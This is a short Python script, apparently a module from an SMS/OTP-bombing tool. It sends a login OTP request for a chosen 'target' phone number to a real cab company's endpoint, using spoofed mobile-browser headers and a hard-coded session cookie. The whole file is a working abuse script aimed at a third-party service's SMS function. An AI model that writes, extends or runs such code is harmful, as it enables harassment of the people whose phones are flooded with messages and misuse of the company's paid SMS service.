import requests

def run(phone_number):
    """
    Sends an OTP request to the given phone number using the specified API.

    :param phone_number: The phone number to target.
    """
    try:
        # API URL
        url = "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php"

        # Headers
        headers = {
            "Host": "www.gopinkcabs.com",
            "accept": "*/*",
            "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Android WebView\";v=\"128\"",
            "sec-ch-ua-platform": "\"Android\"",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F9360 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.146 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.gopinkcabs.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
            "cookie": "previous_timestamp_val=1726811321690; mylocation=27.3337232,79.5545487; PHPSESSID=ir6t7ol3a03ufhbdklu297fm7h",
            "priority": "u=1, i"
        }

        # Data payload
        payload = {
            "check_mobile_number": "1",
            "contact": phone_number
        }

        # Sending the POST request
        response = requests.post(url, headers=headers, data=payload)

        # Check the response
        if response.status_code == 200:
            print("OTP request sent successfully!")
            print("Response:", response.text)
        else:
            print(f"Failed to send OTP. Status: {response.status_code}, Response: {response.text}")

    except Exception as e:
        # Handle any unexpected errors
        print(f"Error occurred while sending OTP: {e}")

# Example usage

